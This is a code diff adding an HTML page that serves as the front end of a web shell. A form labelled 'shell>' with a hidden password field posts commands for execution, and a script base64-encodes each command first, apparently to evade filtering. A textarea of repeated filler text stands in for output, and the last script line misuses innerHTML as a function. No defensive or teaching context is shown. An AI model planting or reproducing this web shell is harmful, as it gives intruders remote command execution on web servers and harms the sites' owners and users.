@@ -1,0 +1,18 @@
+<div style="text-align: left;">
+<div>
+    <form id="cmdFrm" action="" method="post" onsubmit="encode4Submit()">
+        shell><input id="cmd" name="cmd" style="width: 400px;">
+        <input type="hidden" name="password" value="">
+        <input type="submit" value="执行">
+    </form>
+</div><br>
+<textarea style="width: 700px;height:600px;">都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额都是人人呢额</textarea>
+</div>
+<script>
+    function encode4Submit(){
+        var cmdI = document.getElementById("cmd");
+        cmdI.value = window.btoa(cmdI.value);
+        alert(cmdI.value);
+    }
+    document.getElementsByTagName("body")[0].innerHTML();
+</script>
